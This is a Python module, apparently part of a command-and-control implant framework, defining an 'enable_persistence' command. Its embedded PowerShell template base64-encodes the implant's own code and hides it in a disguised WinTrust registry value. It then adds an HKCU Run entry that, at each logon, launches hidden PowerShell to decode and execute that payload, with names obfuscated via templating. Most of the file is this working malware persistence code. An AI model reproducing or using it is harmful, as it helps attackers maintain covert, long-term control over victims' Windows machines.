class EnablePersistence:
    type = "EP"
    args = None
    input = "enable_persistence"

    def process_implant_response(self, data, args):
        if data.decode() == "0":
            return f"Persistence already exists.", None
        else:
            return f"Enabled persistence successfully.", None

    def implant_text(self):
        var = '''
$global:gr = $MyInvocation.MyCommand.ScriptBlock 
function {{ ron.obf_create_persistence }}(){
    $abc = "HKCU:/Software/Microsoft/Windows/CurrentVersion/Run/"
    $def = "HKCU:/Software/Microsoft/Windows/CurrentVersion/WinTrust/Trust Providers/"
    $key = Get-Item -LiteralPath $abc -ErrorAction SilentlyContinue
    $ec = [System.Convert]::ToBase64String([system.Text.Encoding]::utf8.getbytes($global:gr))
    $val = "powershell.exe -win hidden -NonI -c (icm -scriptblock ([scriptblock]::Create([System.Text.Encoding]::utf8.GetString([System.Convert]::FromBase64String((gp 'HKCU:\Software\Microsoft\Windows\CurrentVersion\WinTrust\Trust Providers\').State)))))"
    if ($key.Property -Like "{{ ron.obf_reg_key_name }}"){
        $global:tr = "0"
    } else {
        New-ItemProperty -path $abc -Name {{ ron.obf_reg_key_name }} -Value $val -PropertyType "String" | Out-Null
        New-ItemProperty -Path $def -Name State -Value $ec -PropertyType "String" | Out-Null
        $global:tr = "1"
    }
}'''
        return var

    def pre_process_command(self, argument_string):
        # Check if the argument to be passed to the implant is valid.
        # I.e.
        #    Does the file to be uploaded exist local?
        #    Is the command to be executed dangerous?
        return True


    def create_module_data_string(self, cmd_entry):
        # This function is responsible for creating the argument string which is send to the implant.

        return f"{cmd_entry['args']}"